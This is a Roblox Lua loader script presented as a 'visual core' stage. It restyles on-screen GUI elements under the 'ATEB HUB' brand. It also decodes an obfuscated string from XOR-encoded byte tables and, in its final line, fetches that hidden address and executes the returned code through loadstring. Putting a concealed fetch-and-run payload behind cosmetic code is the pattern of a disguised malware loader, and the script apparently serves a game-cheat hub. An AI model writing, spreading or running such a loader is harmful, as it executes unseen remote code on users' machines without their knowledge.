
--[[ STAGE 2: VISUAL CORE ]]
local N5lpwS6Vt3cXpamSI6CnI = bit32 and bit32.bxor
if not N5lpwS6Vt3cXpamSI6CnI then
    N5lpwS6Vt3cXpamSI6CnI = function(a, b)
        local r, m = 0, 1
        while a > 0 or b > 0 do
            local aa = a % 2
            local bb = b % 2
            if aa ~= bb then r = r + m end
            a = (a - aa) / 2
            b = (b - bb) / 2
            m = m * 2
        end
        return r
    end
end
local function Uo7We2C1xlh9NVObPLA18umcL(data, a, b, m, s, r)
    local out = {}
    for i = 1, #data do
        local v = data[i]
        local step = (b + i * s) % 256
        if m == 0 then
            v = (v - step) % 256
            v = N5lpwS6Vt3cXpamSI6CnI(v, a)
        else
            v = N5lpwS6Vt3cXpamSI6CnI(v, a)
            v = (v - step) % 256
        end
        out[i] = string.char(v)
    end
    local res = table.concat(out)
    if r then
        res = string.reverse(res)
    end
    return res
end
local k0lDRNxoUvI1gjyrvB = {
  {{181, 189, 187, 214, 141}, 179, 214, 0, 5, false, 18},
  {{222, 226, 204}, 24, 105, 0, 1, false, 10},
  {{180, 185, 106, 105, 115, 117}, 192, 58, 1, 4, true, 21},
  {{212, 226, 223}, 180, 231, 1, 6, false, 11},
  {{34, 43, 114}, 197, 121, 0, 5, true, 13},
  {{81, 103, 54, 51, 104, 83, 87}, 23, 235, 0, 1, false, 20},
  {{60, 72, 87, 84, 93, 95, 106}, 58, 237, 0, 6, true, 4},
  {{196, 206, 198, 161}, 154, 199, 0, 4, true, 16},
  {{150, 138, 184, 153, 153}, 102, 137, 1, 2, false, 17},
  {{230, 158, 216, 227, 213, 163}, 152, 230, 0, 1, true, 3},
  {{206, 199, 195, 206, 195, 240, 218}, 125, 170, 0, 2, true, 15},
  {{170, 205, 178, 178, 190, 166, 162}, 232, 226, 1, 1, false, 19},
  {{237, 236, 155}, 37, 83, 1, 1, true, 1},
  {{72, 95, 103, 98}, 70, 161, 1, 4, false, 12},
  {{187, 197, 3, 31}, 216, 12, 0, 7, false, 2},
  {{127, 110, 105, 84, 83, 65}, 179, 102, 1, 5, true, 8},
  {{113, 39, 121, 46, 82}, 146, 121, 1, 4, true, 22},
  {{102, 122, 106, 60, 142, 138, 140}, 36, 21, 0, 7, false, 9},
  {{110, 84, 108, 29, 71, 69}, 53, 234, 1, 4, true, 6},
  {{129, 70, 73}, 107, 57, 0, 4, false, 7},
  {{93, 114, 108, 171}, 195, 186, 0, 1, true, 23},
  {{9, 29, 85, 8, 10, 15}, 205, 84, 1, 7, false, 14},
  {{169, 185, 180, 182, 179, 195, 175}, 100, 167, 0, 1, true, 5}
}
local vtGVTuSqt9CC3DVtC3NFX = {}
for zdx519VNahmOTyR = 1, #k0lDRNxoUvI1gjyrvB do
    local GRyU5K6dAYeJMUfxYhal = k0lDRNxoUvI1gjyrvB[zdx519VNahmOTyR]
    vtGVTuSqt9CC3DVtC3NFX[GRyU5K6dAYeJMUfxYhal[7]] = Uo7We2C1xlh9NVObPLA18umcL(GRyU5K6dAYeJMUfxYhal[1], GRyU5K6dAYeJMUfxYhal[2], GRyU5K6dAYeJMUfxYhal[3], GRyU5K6dAYeJMUfxYhal[4], GRyU5K6dAYeJMUfxYhal[5], GRyU5K6dAYeJMUfxYhal[6])
end
local vkeBWFKhe9WD_XymUwHNS = table.concat(vtGVTuSqt9CC3DVtC3NFX)
local HubName = "ATEB HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(vkeBWFKhe9WD_XymUwHNS))()
